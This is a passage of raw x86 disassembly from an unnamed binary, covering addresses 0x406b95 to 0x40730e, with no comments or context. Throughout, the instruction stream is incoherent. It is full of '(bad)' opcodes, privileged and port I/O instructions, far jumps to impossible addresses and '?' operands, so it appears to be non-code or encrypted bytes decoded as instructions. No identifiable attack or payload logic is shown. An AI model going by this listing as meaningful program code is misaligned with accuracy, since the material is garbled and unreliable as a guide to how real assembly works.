  406b95:	cs xchg esp,eax
  406b97:	outs   dx,BYTE PTR ds:[esi]
  406b98:	push   ebx
  406b99:	loope  0x406b60
  406b9b:	push   cs
  406b9c:	xor    al,0xd2
  406b9e:	cmp    DWORD PTR [edi],0xc2f7b98b
  406ba4:	cmc    
  406ba5:	jp     0x406bda
  406ba7:	lods   eax,DWORD PTR ds:[esi]
  406ba8:	aam    0xd7
  406baa:	icebp  
  406bab:	adc    al,0xc7
  406bad:	loope  0x406c24
  406baf:	mov    al,al
  406bb1:	mov    dl,0x73
  406bb3:	call   0x59f8b649
  406bb8:	ins    DWORD PTR es:[edi],dx
  406bb9:	or     BYTE PTR [ecx-0x1b],dh
  406bbc:	lds    esp,FWORD PTR [esi-0x29]
  406bbf:	and    eax,0xc60e46af
  406bc4:	sub    al,0x9
  406bc6:	pop    eax
  406bc7:	iret   
  406bc8:	loope  0x406c04
  406bca:	test   al,0xb5
  406bcc:	cwde   
  406bcd:	jae    0x406baf
  406bcf:	fisttp DWORD PTR [esi]
  406bd1:	lods   al,BYTE PTR ds:[esi]
  406bd2:	fst    st(6)
  406bd4:	xor    eax,0xec3e0847
  406bd9:	lds    ebp,FWORD PTR [ebp+0x74]
  406bdc:	lods   eax,DWORD PTR ds:[esi]
  406bdd:	xchg   DWORD PTR [edi],ebx
  406bdf:	mov    ch,0xb0
  406be1:	fmul   QWORD PTR [esp+ebx*1]
  406be4:	(bad)  
  406be5:	aas    
  406be6:	cli    
  406be7:	cmp    BYTE PTR [ecx-0x1177c4ca],al
  406bed:	hlt    
  406bee:	add    DWORD PTR [ebp+0x46fa8823],ebp
  406bf4:	test   BYTE PTR [ebx-0x54],ah
  406bf7:	das    
  406bf8:	cdq    
  406bf9:	mov    bh,0xa
  406bfb:	mov    bh,0x4e
  406bfd:	cmp    DWORD PTR [ebx+0x28],ebp
  406c00:	push   edx
  406c01:	data16 sub dl,0xa0
  406c05:	mov    eax,ds:0x4f7c703
  406c0a:	or     al,0xe0
  406c0c:	jmp    0x55d25d85
  406c11:	ins    DWORD PTR es:[edi],dx
  406c12:	mov    WORD PTR [edx-0x6],?
  406c15:	fisub  DWORD PTR [ecx+0x483da27f]
  406c1b:	jecxz  0x406bec
  406c1d:	adc    al,0xa9
  406c1f:	stc    
  406c20:	pop    ecx
  406c21:	mov    ds:0x82a13eb0,eax
  406c26:	sahf   
  406c27:	retf   0x578a
  406c2a:	dec    ebx
  406c2b:	scas   al,BYTE PTR es:[edi]
  406c2c:	daa    
  406c2d:	pop    esp
  406c2e:	adc    al,0xd0
  406c30:	js     0x406c00
  406c32:	test   BYTE PTR [eax+edx*1-0x2c2abb90],ch
  406c39:	add    eax,0x45c7a663
  406c3e:	popa   
  406c3f:	(bad)  
  406c40:	in     eax,0xa2
  406c42:	xchg   BYTE PTR [edi-0x35],dh
  406c45:	ds sbb esp,ebp
  406c48:	xor    DWORD PTR [edx],esi
  406c4a:	add    BYTE PTR [eax],bh
  406c4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c4d:	xchg   ecx,eax
  406c4e:	ins    DWORD PTR es:[edi],dx
  406c4f:	pop    ss
  406c50:	pop    edi
  406c51:	sub    eax,0xbf7107d8
  406c56:	xchg   ebx,eax
  406c57:	mov    edx,0x99b48e66
  406c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c5d:	jge    0x406c6c
  406c5f:	jns    0x406c44
  406c61:	xchg   esi,eax
  406c62:	or     BYTE PTR [ecx],ah
  406c64:	mov    fs,WORD PTR [ebx+0x69a1f3e6]
  406c6a:	push   0xc26d52db
  406c6f:	push   DWORD PTR ds:0x55465809
  406c75:	scas   al,BYTE PTR es:[edi]
  406c76:	pop    edi
  406c77:	in     al,dx
  406c78:	and    DWORD PTR [ecx],ecx
  406c7a:	push   edx
  406c7b:	mov    WORD PTR [ecx],ss
  406c7d:	sub    ecx,esp
  406c7f:	ins    BYTE PTR es:[edi],dx
  406c80:	sbb    al,0xac
  406c82:	cmc    
  406c83:	mov    cl,0xe6
  406c85:	(bad)  
  406c86:	pop    eax
  406c87:	or     bh,BYTE PTR [esi+0x11]
  406c8a:	lds    edx,FWORD PTR [edx]
  406c8c:	test   DWORD PTR [ebp-0x54cbad4b],esi
  406c92:	add    bh,ah
  406c94:	push   ebx
  406c95:	outs   dx,BYTE PTR ds:[esi]
  406c96:	imul   edx,esp,0xffffffa0
  406c99:	mov    bl,0xa9
  406c9b:	push   0xb6d201ee
  406ca0:	xor    BYTE PTR [edx],al
  406ca2:	xor    edi,DWORD PTR [esi]
  406ca4:	xchg   ebx,eax
  406ca5:	mov    eax,ds:0xc54d6ed3
  406caa:	je     0x406cef
  406cac:	xor    bl,BYTE PTR [ecx-0x35]
  406caf:	or     eax,0xae5d0dbd
  406cb4:	inc    ebp
  406cb5:	push   es
  406cb6:	lods   al,BYTE PTR ds:[esi]
  406cb7:	idiv   DWORD PTR [edi+0x101e84cb]
  406cbd:	mov    eax,ds:0x7bb950f7
  406cc2:	lods   al,BYTE PTR ds:[esi]
  406cc3:	sahf   
  406cc4:	mov    dh,0x61
  406cc6:	stc    
  406cc7:	in     al,dx
  406cc8:	dec    ebx
  406cc9:	xor    eax,0xc91d5f1
  406cce:	cmp    edi,DWORD PTR [edx]
  406cd0:	test   eax,0x60c3d86e
  406cd5:	adc    al,0xe9
  406cd7:	out    0x8a,eax
  406cd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cda:	loopne 0x406ca8
  406cdc:	mov    ?,edx
  406cde:	inc    edi
  406cdf:	test   DWORD PTR [ebx-0x6],0xe5a73c83
  406ce6:	jp     0x406d36
  406ce8:	pop    eax
  406ce9:	inc    esp
  406cea:	add    DWORD PTR [ebp+0x4d466a44],esp
  406cf0:	stc    
  406cf1:	pusha  
  406cf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cf3:	daa    
  406cf4:	and    DWORD PTR ds:0x318b8449,edi
  406cfa:	pop    edx
  406cfb:	scas   al,BYTE PTR es:[edi]
  406cfc:	push   ds
  406cfd:	pop    eax
  406cfe:	pop    eax
  406cff:	cli    
  406d00:	mov    DWORD PTR [esi-0xfcdd514],0x5de561c4
  406d0a:	add    BYTE PTR [ecx+0x576101ac],0x89
  406d11:	retf   0x82de
  406d14:	xchg   edx,eax
  406d15:	mov    eax,ds:0xb0217fd5
  406d1a:	add    bh,BYTE PTR [eax-0x68cdfc95]
  406d20:	mov    ch,0x7e
  406d22:	ret    
  406d23:	sub    BYTE PTR [esi],dh
  406d25:	pop    ebx
  406d26:	fld    DWORD PTR [ebx+edx*8+0x3a]
  406d2a:	pop    ss
  406d2b:	pop    edx
  406d2c:	mov    ds:0xda575cda,eax
  406d31:	or     BYTE PTR [eax],al
  406d33:	clc    
  406d34:	sub    edi,DWORD PTR [edx+0x68]
  406d37:	(bad)  
  406d38:	sub    DWORD PTR [edx-0x38],edx
  406d3b:	std    
  406d3c:	or     BYTE PTR [ebp+0x5f],ch
  406d3f:	aaa    
  406d40:	and    ebp,DWORD PTR [ebx-0xd]
  406d43:	lahf   
  406d44:	(bad)  
  406d45:	push   cs
  406d46:	leave  
  406d47:	and    ch,bh
  406d49:	cmp    al,0x56
  406d4b:	or     eax,0x70688652
  406d50:	inc    ebx
  406d51:	(bad)  
  406d52:	sub    al,0x49
  406d54:	mov    esi,0x3eb7d5db
  406d59:	mov    edx,0xcd3c7303
  406d5e:	sub    eax,0x5051c23a
  406d63:	inc    ebx
  406d64:	adc    DWORD PTR [ebp-0x77],ebp
  406d67:	iret   
  406d68:	jmp    0x406d9b
  406d6a:	mov    edi,0x12c30ff7
  406d6f:	push   ss
  406d70:	hlt    
  406d71:	in     al,0xdb
  406d73:	stos   BYTE PTR es:[edi],al
  406d74:	inc    eax
  406d75:	mov    ds:0x6f059190,eax
  406d7a:	mov    cl,0x2e
  406d7c:	aad    0x94
  406d7e:	push   edi
  406d7f:	stc    
  406d80:	mov    bl,0x10
  406d82:	fsubp  st(2),st
  406d84:	ss inc ebx
  406d86:	jp     0x406d32
  406d88:	dec    eax
  406d89:	lahf   
  406d8a:	or     ah,bh
  406d8c:	push   esi
  406d8d:	sahf   
  406d8e:	cwde   
  406d8f:	dec    edi
  406d90:	jnp    0x406d8f
  406d92:	mov    WORD PTR [esp+esi*8],es
  406d95:	add    BYTE PTR gs:[edx-0x49c4aaad],cl
  406d9c:	xor    BYTE PTR [edx-0x394c8474],dl
  406da2:	aaa    
  406da3:	int    0xc6
  406da5:	pop    esp
  406da6:	jno    0x406d77
  406da8:	adc    al,0x32
  406daa:	cmp    al,0x5a
  406dac:	int3   
  406dad:	xor    edx,DWORD PTR [ebx]
  406daf:	mov    dh,0xf4
  406db1:	mov    esp,0x55693c9a
  406db6:	dec    edx
  406db7:	jno    0x406dfe
  406db9:	jge    0x406d73
  406dbb:	imul   esp,esp,0x7f878a18
  406dc1:	fcom   DWORD PTR [edx]
  406dc3:	fild   QWORD PTR [ebx+0x76]
  406dc6:	push   edi
  406dc7:	and    esi,DWORD PTR [esi]
  406dc9:	popf   
  406dca:	inc    edx
  406dcb:	cmp    ebx,0xffffff99
  406dce:	xchg   cl,ah
  406dd0:	xchg   ebx,eax
  406dd1:	ficom  WORD PTR [ebx]
  406dd3:	mov    dl,0xa0
  406dd5:	pusha  
  406dd6:	repz in al,0xcc
  406dd9:	pop    ebx
  406dda:	lods   al,BYTE PTR ds:[esi]
  406ddb:	sbb    eax,ebx
  406ddd:	jp     0x406d9a
  406ddf:	mov    eax,0x8e557c86
  406de4:	jmp    ebp
  406de6:	fdivr  DWORD PTR [ecx-0x3d]
  406de9:	or     ecx,edx
  406deb:	sub    dh,BYTE PTR [esi-0x24]
  406dee:	pop    ebx
  406def:	call   0xfe9edd3e
  406df4:	popa   
  406df5:	std    
  406df6:	xor    al,0xe5
  406df8:	push   0x68
  406dfa:	dec    edx
  406dfb:	lea    edi,[eax]
  406dfd:	pop    eax
  406dfe:	aad    0x54
  406e00:	dec    ebx
  406e01:	xchg   bl,dh
  406e03:	ficom  DWORD PTR [ebp+edi*1+0x4928a19a]
  406e0a:	outs   dx,BYTE PTR ds:[esi]
  406e0b:	sbb    BYTE PTR [ecx-0x32],dl
  406e0e:	clc    
  406e0f:	xor    ebx,ebx
  406e11:	mov    dh,0x85
  406e13:	stc    
  406e14:	jg     0x406d98
  406e16:	nop
  406e17:	neg    DWORD PTR [ebp+0x54]
  406e1a:	inc    ecx
  406e1b:	imul   esi,DWORD PTR [edx+0x3bee9b5a],0x362873be
  406e25:	mov    bh,0x99
  406e27:	xor    eax,0x3adb85aa
  406e2c:	call   0x1f14:0x1e3c2d25
  406e33:	jno    0x406e78
  406e35:	outs   dx,DWORD PTR ds:[esi]
  406e36:	rcr    DWORD PTR [ecx+0x52],cl
  406e39:	add    dh,BYTE PTR [ecx-0x19]
  406e3c:	sub    ch,BYTE PTR [edx]
  406e3e:	and    bl,BYTE PTR [eax]
  406e40:	push   0xe600e1fe
  406e45:	gs pop esi
  406e47:	icebp  
  406e48:	mov    DWORD PTR [edx],ebx
  406e4a:	sub    DWORD PTR [edx+ecx*2+0x6b60440e],eax
  406e51:	ret    0x25d2
  406e54:	jp     0x406e1b
  406e56:	sub    cl,ch
  406e58:	mov    bh,0x29
  406e5a:	aas    
  406e5b:	xchg   esp,eax
  406e5c:	call   0x6a04:0x24110c8b
  406e63:	fimul  DWORD PTR [edx]
  406e65:	xor    BYTE PTR [ebx-0x72],al
  406e68:	jmp    ebx
  406e6a:	or     esi,edx
  406e6c:	jl     0x406ecb
  406e6e:	dec    eax
  406e6f:	jno    0x406e80
  406e71:	jo     0x406e8e
  406e73:	or     eax,0xe9f65ad1
  406e78:	pop    ebp
  406e79:	das    
  406e7a:	loop   0x406e93
  406e7c:	aas    
  406e7d:	mov    edx,0x119d6579
  406e82:	ret    0xb1d1
  406e85:	inc    eax
  406e86:	jne    0x406e7f
  406e88:	xchg   edx,eax
  406e89:	xchg   edx,eax
  406e8a:	(bad)  
  406e8b:	mov    edx,0x5433a2e5
  406e90:	cs shl al,1
  406e93:	push   esi
  406e94:	or     BYTE PTR [eax],dh
  406e96:	or     eax,0xc32397ca
  406e9b:	inc    edi
  406e9c:	push   cs
  406e9d:	sub    eax,0xff2b5ce8
  406ea2:	scas   al,BYTE PTR es:[edi]
  406ea3:	push   esp
  406ea4:	mov    cl,0xf8
  406ea6:	sbb    esi,esi
  406ea8:	scas   al,BYTE PTR es:[edi]
  406ea9:	inc    ebx
  406eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406eab:	out    dx,al
  406eac:	or     cl,dl
  406eae:	pop    ds
  406eaf:	push   esi
  406eb0:	clc    
  406eb1:	(bad)  
  406eb2:	outs   dx,DWORD PTR ds:[esi]
  406eb3:	push   edi
  406eb4:	pusha  
  406eb5:	fbld   TBYTE PTR [esi]
  406eb7:	aad    0xf4
  406eb9:	pop    es
  406eba:	inc    ebx
  406ebb:	test   al,0x2d
  406ebd:	cwde   
  406ebe:	or     BYTE PTR [esi+eiz*8],al
  406ec1:	inc    ecx
  406ec2:	popa   
  406ec3:	mov    bl,0xe7
  406ec5:	cld    
  406ec6:	sub    al,0xa3
  406ec8:	sub    bh,BYTE PTR [edi+0x30]
  406ecb:	dec    BYTE PTR [esi-0x26]
  406ece:	push   ecx
  406ecf:	out    dx,al
  406ed0:	xchg   ebp,eax
  406ed1:	sbb    eax,0x7cd429bb
  406ed6:	pop    ecx
  406ed7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ed8:	in     eax,dx
  406ed9:	cs push cs
  406edb:	add    eax,0x7167e68a
  406ee0:	and    ebx,edx
  406ee2:	fnstsw WORD PTR [ebp-0x582fc4ea]
  406ee8:	fwait
  406ee9:	add    eax,0xaaf759b3
  406eee:	mov    edi,0xd06c9a89
  406ef3:	sbb    bl,BYTE PTR ds:0x6c4ff843
  406ef9:	sub    al,0xaf
  406efb:	in     al,0xdb
  406efd:	push   0xe4116bb9
  406f02:	(bad)  
  406f03:	or     al,0xcc
  406f05:	xor    dh,cl
  406f07:	fld    TBYTE PTR [esi]
  406f09:	sbb    bl,BYTE PTR [ebx]
  406f0b:	ret    
  406f0c:	lods   eax,DWORD PTR ds:[esi]
  406f0d:	dec    ecx
  406f0e:	imul   eax,DWORD PTR ds:0x8da95bc6,0x7856dd0a
  406f18:	ror    BYTE PTR [ebp+0x79],cl
  406f1b:	push   es
  406f1c:	in     eax,0x15
  406f1e:	outs   dx,BYTE PTR ds:[esi]
  406f1f:	fwait
  406f20:	add    al,BYTE PTR [eax-0x50]
  406f23:	jp     0x406f94
  406f25:	dec    ebp
  406f26:	imul   edx,DWORD PTR [edx+ecx*8+0x75ab282e],0xffffffd0
  406f2e:	push   0x4e
  406f30:	ret    0x6c02
  406f33:	mov    bl,0x9
  406f35:	popa   
  406f36:	test   eax,0x8a585fe0
  406f3b:	sar    DWORD PTR [ecx+esi*8],0x7c
  406f3f:	jae    0x406f64
  406f41:	ret    
  406f42:	sbb    esp,DWORD PTR [esi+0x6b4c61f5]
  406f48:	cmc    
  406f49:	or     BYTE PTR [eax+0x48],ch
  406f4c:	or     eax,0x1f7225
  406f51:	inc    edi
  406f52:	cmp    al,0x80
  406f54:	sub    ch,BYTE PTR [edx-0x73]
  406f57:	aad    0xb5
  406f59:	(bad)  
  406f5b:	and    DWORD PTR [bx+0x5e77],esi
  406f60:	pusha  
  406f61:	adc    DWORD PTR [esi],0x78209f09
  406f67:	mov    ecx,0x44880fb0
  406f6c:	xor    esi,eax
  406f6e:	dec    ebp
  406f6f:	push   ecx
  406f70:	and    al,0xf6
  406f72:	in     eax,0x83
  406f74:	je     0x406fb4
  406f76:	mov    cl,0x3b
  406f78:	jne    0x406efd
  406f7a:	sbb    DWORD PTR [edi+eiz*1+0x174b2b05],ebx
  406f81:	pop    es
  406f82:	es add eax,0xf7e7d26d
  406f88:	(bad)  
  406f89:	mov    edi,0x2570e97c
  406f8e:	adc    eax,0xd32e22c
  406f93:	sub    BYTE PTR [ecx-0x47d9272a],ch
  406f99:	aaa    
  406f9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f9b:	mov    bl,0xb
  406f9d:	xor    DWORD PTR [esi+0x6f],edi
  406fa0:	xlat   BYTE PTR ds:[ebx]
  406fa1:	pop    esp
  406fa2:	pop    es
  406fa3:	pop    esi
  406fa4:	lods   eax,DWORD PTR ds:[esi]
  406fa5:	sbb    al,0xfd
  406fa7:	in     eax,dx
  406fa8:	and    DWORD PTR [eax-0x49b9e56f],0xaa317593
  406fb2:	lods   eax,DWORD PTR ds:[esi]
  406fb3:	mov    fs,WORD PTR [edi+eax*8]
  406fb6:	hlt    
  406fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fb8:	and    BYTE PTR [edx],dh
  406fba:	jmp    0x42ba:0x177c73e9
  406fc1:	push   esp
  406fc2:	(bad)  
  406fc3:	cli    
  406fc4:	bound  esi,QWORD PTR [edx+0x67]
  406fc7:	xor    BYTE PTR [edi+0x12bdfa2a],al
  406fcd:	fwait
  406fce:	sub    eax,0xf0ac13a4
  406fd3:	add    edx,DWORD PTR [edi+0x55f13700]
  406fd9:	dec    edx
  406fda:	jge    0x407030
  406fdc:	pop    ss
  406fdd:	push   ebp
  406fde:	xchg   edi,eax
  406fdf:	jle    0x40700f
  406fe1:	cmp    ah,BYTE PTR [esi+0x31]
  406fe4:	daa    
  406fe5:	ret    0x1bec
  406fe8:	aas    
  406fe9:	adc    DWORD PTR [eax],edi
  406feb:	push   ebp
  406fec:	inc    eax
  406fed:	push   cs
  406fee:	aad    0xa6
  406ff0:	and    ecx,esi
  406ff2:	add    BYTE PTR es:[esi-0x13],bh
  406ff6:	inc    esi
  406ff7:	enter  0xd1c8,0xe7
  406ffb:	xlat   BYTE PTR ds:[ebx]
  406ffc:	sub    al,0x98
  406ffe:	mov    esp,DWORD PTR [ecx]
  407000:	or     al,0xc7
  407002:	out    dx,eax
  407003:	pusha  
  407004:	cmp    al,0x81
  407006:	fstp   QWORD PTR [esi+0x770fb8b5]
  40700c:	push   ebx
  40700d:	inc    eax
  40700e:	and    al,0xdc
  407010:	popf   
  407011:	pop    edi
  407012:	or     eax,0xda4ffc6a
  407017:	loopne 0x40705f
  407019:	or     dl,BYTE PTR ds:0x803f1c99
  40701f:	sti    
  407020:	ja     0x407086
  407022:	jg     0x406ff0
  407024:	in     eax,0xfb
  407026:	mov    edi,0x13ad8499
  40702b:	(bad)  [eax+ecx*8]
  40702e:	outs   dx,DWORD PTR ds:[esi]
  40702f:	push   esp
  407030:	adc    BYTE PTR [edx+0x5e],ch
  407033:	xchg   edx,eax
  407034:	cmc    
  407035:	test   al,0x5f
  407037:	and    eax,0x2f6befa2
  40703c:	ret    
  40703d:	adc    esp,eax
  40703f:	push   edi
  407040:	icebp  
  407041:	push   edi
  407042:	test   DWORD PTR [ebx+ebx*4],eax
  407045:	sub    eax,0x799fd76d
  40704a:	sbb    BYTE PTR [edi+ebp*2-0x1e],cl
  40704e:	push   ebx
  40704f:	(bad)  
  407050:	jp     0x4070a0
  407052:	aaa    
  407053:	dec    edx
  407054:	in     al,0x34
  407056:	or     BYTE PTR [esi-0xa5f3a61],bh
  40705c:	inc    esp
  40705d:	popa   
  40705e:	xchg   BYTE PTR [edx+0x2a],dl
  407061:	sbb    DWORD PTR [esi-0x578e4705],ebp
  407067:	xor    ebx,0xd8ccdfe7
  40706d:	inc    eax
  40706e:	mov    WORD PTR [edx+edi*2+0x688f0106],ds
  407075:	aas    
  407076:	dec    ebx
  407077:	ja     0x407018
  407079:	out    dx,al
  40707a:	dec    esp
  40707b:	js     0x407086
  40707d:	add    al,0x85
  40707f:	sbb    cl,BYTE PTR [ebx]
  407081:	push   ebp
  407082:	add    esp,DWORD PTR [ebp-0x636869f1]
  407088:	xlat   BYTE PTR ds:[ebx]
  407089:	fs stos BYTE PTR es:[edi],al
  40708b:	sbb    BYTE PTR [esp+ebp*1],0x63
  40708f:	mov    ds:0xd8ad5061,eax
  407094:	fcmovbe st,st(2)
  407096:	jno    0x407075
  407098:	fs jae 0x40708c
  40709b:	jg     0x4070f8
  40709d:	xor    al,0x3f
  40709f:	mov    esi,?
  4070a1:	pop    ss
  4070a2:	pop    ebp
  4070a3:	adc    al,bh
  4070a5:	push   ebx
  4070a6:	loopne 0x4070fc
  4070a8:	shl    BYTE PTR [esi+0x2b],1
  4070ab:	pop    es
  4070ac:	push   ss
  4070ad:	push   ss
  4070ae:	out    dx,eax
  4070af:	add    eax,0x49e2da48
  4070b4:	lds    esi,FWORD PTR [ebx-0x5e]
  4070b7:	imul   ebx,DWORD PTR [ebp+0x5],0x6d
  4070bb:	xchg   DWORD PTR ds:0x14d0f8a9,ebx
  4070c1:	cmp    eax,0x8b85ee02
  4070c6:	ja     0x4070d4
  4070c8:	mov    bl,0x74
  4070ca:	stos   DWORD PTR es:[edi],eax
  4070cb:	iret   
  4070cc:	mov    edi,0xfa89d7c7
  4070d1:	sbb    eax,ecx
  4070d3:	jnp    0x4070b6
  4070d5:	jo     0x40712e
  4070d7:	retf   
  4070d8:	xor    al,BYTE PTR [ebp+0x5c]
  4070db:	test   DWORD PTR [ebp+0x7a],ecx
  4070de:	add    bh,BYTE PTR [ebp+0x37]
  4070e1:	rcr    al,1
  4070e3:	fwait
  4070e4:	test   DWORD PTR [edi-0x4c328c69],esp
  4070ea:	fcomip st,st(6)
  4070ec:	loope  0x407117
  4070ee:	(bad)  
  4070ef:	sub    dh,0xd9
  4070f2:	or     bh,BYTE PTR [esi]
  4070f4:	add    DWORD PTR [ebx+0x5df26202],0xdef076f4
  4070fe:	jp     0x4070b3
  407100:	or     al,0xd
  407102:	xchg   esi,eax
  407103:	add    eax,0x821383c7
  407108:	data16 or BYTE PTR [esi],al
  40710b:	add    BYTE PTR [eax],cl
  40710d:	dec    edx
  40710e:	push   0xde1e7128
  407113:	jecxz  0x407173
  407115:	(bad)  
  407116:	mov    dh,0x52
  407118:	sbb    DWORD PTR [esp+edi*1],ebp
  40711b:	outs   dx,DWORD PTR ds:[esi]
  40711c:	aas    
  40711d:	and    BYTE PTR [eax+0x5],al
  407120:	leave  
  407121:	xor    eax,0x630c8d73
  407126:	ja     0x407167
  407128:	jecxz  0x4070b0
  40712a:	stos   DWORD PTR es:[edi],eax
  40712b:	imul   esi,DWORD PTR [eax-0x47],0xcc3e890c
  407132:	add    eax,0xe1b0d269
  407137:	and    al,0x28
  407139:	arpl   di,ax
  40713b:	inc    ecx
  40713c:	daa    
  40713d:	push   ecx
  40713e:	das    
  40713f:	inc    esp
  407140:	inc    edx
  407141:	sub    edx,esi
  407143:	dec    esp
  407144:	sti    
  407145:	call   0x9994:0xfdbf1e74
  40714c:	lods   eax,DWORD PTR ds:[esi]
  40714d:	dec    ebx
  40714e:	and    esi,DWORD PTR [ebx+0xb]
  407151:	jne    0x407180
  407153:	xchg   esi,eax
  407154:	iret   
  407155:	lahf   
  407156:	add    ebp,esi
  407158:	push   DWORD PTR [ebp+0x55]
  40715b:	ret    0x32b1
  40715e:	xor    al,0x6b
  407160:	pop    eax
  407161:	mov    DWORD PTR [edi+0xd156155],ecx
  407167:	inc    esi
  407168:	in     al,0x29
  40716a:	adc    ah,BYTE PTR [ebx+edi*4+0x68]
  40716e:	pop    esi
  40716f:	sbb    eax,0x6ca5f83c
  407174:	test   BYTE PTR [ebp+eiz*8-0x2a9b57f3],ah
  40717b:	sub    al,0x9f
  40717d:	xchg   edi,eax
  40717e:	push   esp
  40717f:	and    DWORD PTR gs:[esi],edi
  407182:	pop    edi
  407183:	jno    0x4071ab
  407185:	pop    es
  407186:	or     BYTE PTR [eax+esi*2],0x31
  40718a:	ret    0xb9fc
  40718d:	daa    
  40718e:	jp     0x4071f9
  407190:	ins    DWORD PTR es:[edi],dx
  407191:	das    
  407192:	push   esp
  407193:	and    ebx,DWORD PTR [ecx]
  407195:	das    
  407196:	mov    eax,0xe759125c
  40719b:	in     eax,dx
  40719c:	loopne 0x40713b
  40719e:	adc    al,0x68
  4071a0:	nop
  4071a1:	xchg   DWORD PTR [edx-0x1efaccfd],esi
  4071a7:	jecxz  0x407181
  4071a9:	adc    BYTE PTR [edx-0x62548c81],bh
  4071af:	retf   
  4071b0:	cmp    esp,DWORD PTR [ecx]
  4071b2:	repz mov ebp,ebp
  4071b5:	xchg   edi,eax
  4071b6:	aas    
  4071b7:	mov    esi,0xbc6a2317
  4071bc:	sti    
  4071bd:	xlat   BYTE PTR ds:[ebx]
  4071be:	sbb    bl,BYTE PTR ds:[ecx-0x4c]
  4071c2:	outs   dx,DWORD PTR ds:[esi]
  4071c3:	js     0x40718a
  4071c5:	inc    ecx
  4071c6:	in     al,dx
  4071c7:	adc    DWORD PTR [ebx+0x6a],eax
  4071ca:	xlat   BYTE PTR ds:[ebx]
  4071cb:	dec    esp
  4071cc:	xchg   ebp,eax
  4071cd:	jnp    0x4071e9
  4071cf:	jmp    0x2895:0x2c013994
  4071d6:	in     al,0x6b
  4071d8:	sbb    ecx,DWORD PTR [ecx+esi*2+0x5c]
  4071dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071dd:	xchg   esi,eax
  4071de:	mov    esi,0xa76236ce
  4071e3:	xor    dh,0xcc
  4071e6:	sti    
  4071e7:	pop    DWORD PTR [ecx+0x5976fa7c]
  4071ed:	mov    esp,0xc2d1d13b
  4071f2:	inc    ecx
  4071f3:	retf   
  4071f4:	ins    BYTE PTR es:[edi],dx
  4071f5:	lea    edi,[eax-0x6e47702d]
  4071fb:	pop    ss
  4071fc:	stc    
  4071fd:	(bad)  [esi+edx*8+0x34cd921]
  407204:	popa   
  407205:	or     al,0x6
  407207:	rol    BYTE PTR [edx+0x4a],1
  40720a:	fwait
  40720b:	sub    eax,0x451b6bf1
  407210:	mov    al,0x38
  407212:	dec    eax
  407213:	xchg   ebp,eax
  407214:	scas   al,BYTE PTR es:[edi]
  407215:	add    eax,0x9ab40fe6
  40721a:	mov    ds:0xf7210054,eax
  40721f:	arpl   WORD PTR [eax-0x6d],si
  407222:	pop    edi
  407223:	jl     0x4071c0
  407225:	cmp    BYTE PTR [esp+ebx*2],0xd9
  407229:	jnp    0x40726f
  40722b:	dec    edi
  40722c:	jbe    0x4071ca
  40722e:	or     al,0xf2
  407230:	mov    DWORD PTR [eax+0x63],eax
  407233:	push   eax
  407234:	mov    dl,BYTE PTR [edi]
  407236:	cli    
  407237:	xor    edi,DWORD PTR [ebp-0x3d]
  40723a:	(bad)  
  40723b:	(bad)  [ebp-0x7328ea4f]
  407241:	cmp    dh,BYTE PTR [edi+0x0]
  407244:	mov    esi,0x6085de7b
  407249:	bnd jb 0x4071f2
  40724c:	out    0xc1,eax
  40724e:	push   ebx
  40724f:	and    al,0x5b
  407251:	ret    
  407252:	ja     0x40723f
  407254:	sbb    cl,BYTE PTR [edi]
  407256:	sub    edi,DWORD PTR [ebp+0x14]
  407259:	mov    ecx,DWORD PTR [ebx-0x63ede540]
  40725f:	mov    esi,0x64a42b02
  407264:	jae    0x4072bd
  407266:	retf   
  407267:	pop    ecx
  407268:	mov    esi,0x322dc945
  40726d:	mov    esp,DWORD PTR ds:0x4fb2da52
  407273:	cld    
  407274:	xchg   edx,eax
  407275:	in     al,0x20
  407277:	test   DWORD PTR [edx],0x41c8db4f
  40727d:	mov    esp,0xf21dbd1c
  407282:	adc    al,0xf4
  407284:	adc    edx,edi
  407286:	and    al,0x17
  407288:	or     dl,bh
  40728a:	jns    0x407241
  40728c:	mov    ecx,DWORD PTR [edx]
  40728e:	(bad)  
  40728f:	jp     0x4072a2
  407291:	daa    
  407292:	lods   al,BYTE PTR ds:[esi]
  407293:	cdq    
  407294:	ss dec edx
  407296:	add    eax,0xb59ffe3b
  40729b:	add    eax,0x619d5f49
  4072a0:	dec    esi
  4072a1:	jecxz  0x40730e
  4072a3:	and    edi,DWORD PTR [esi]
  4072a5:	call   0x36fc:0xb01410c2
  4072ac:	imul   esp,DWORD PTR [esi-0x4a],0x36
  4072b0:	jl     0x407232
  4072b2:	xchg   DWORD PTR [edx+0x2f],ebx
  4072b5:	push   edi
  4072b6:	mov    cl,0xfe
  4072b8:	lahf   
  4072b9:	or     DWORD PTR [eax+esi*8+0x74],ebx
  4072bd:	pop    ss
  4072be:	stos   DWORD PTR es:[edi],eax
  4072bf:	std    
  4072c0:	int    0x19
  4072c2:	rcl    ch,1
  4072c4:	adc    DWORD PTR [edi-0x10c2d8cb],esp
  4072ca:	xor    BYTE PTR [esi],ch
  4072cc:	enter  0x679a,0x99
  4072d0:	sub    eax,edi
  4072d2:	popf   
  4072d3:	dec    edi
  4072d4:	dec    edi
  4072d5:	call   0xee47:0xd3bde0a5
  4072dc:	fist   WORD PTR [esi+0x4a]
  4072df:	ret    0xc7a8
  4072e2:	push   ebx
  4072e3:	push   ebx
  4072e4:	xchg   BYTE PTR [ecx-0x33c1d031],al
  4072ea:	or     bl,ch
  4072ec:	dec    ebx
  4072ed:	vminps ymm3,ymm0,YMMWORD PTR [edi-0x71]
  4072f2:	ins    BYTE PTR es:[edi],dx
  4072f3:	xor    eax,0x8413d1dc
  4072f8:	add    al,0x8e
  4072fa:	scas   al,BYTE PTR es:[edi]
  4072fb:	int3   
  4072fc:	repnz sbb al,0x3c
  4072ff:	lsl    esi,cx
  407302:	inc    esi
  407303:	imul   BYTE PTR [eax]
  407305:	leave  
  407306:	lea    ebp,[ebx-0x3c3f4727]
  40730c:	push   ebp
  40730d:	cmc    
  40730e:	adc    edi,DWORD PTR [esi+0x47]
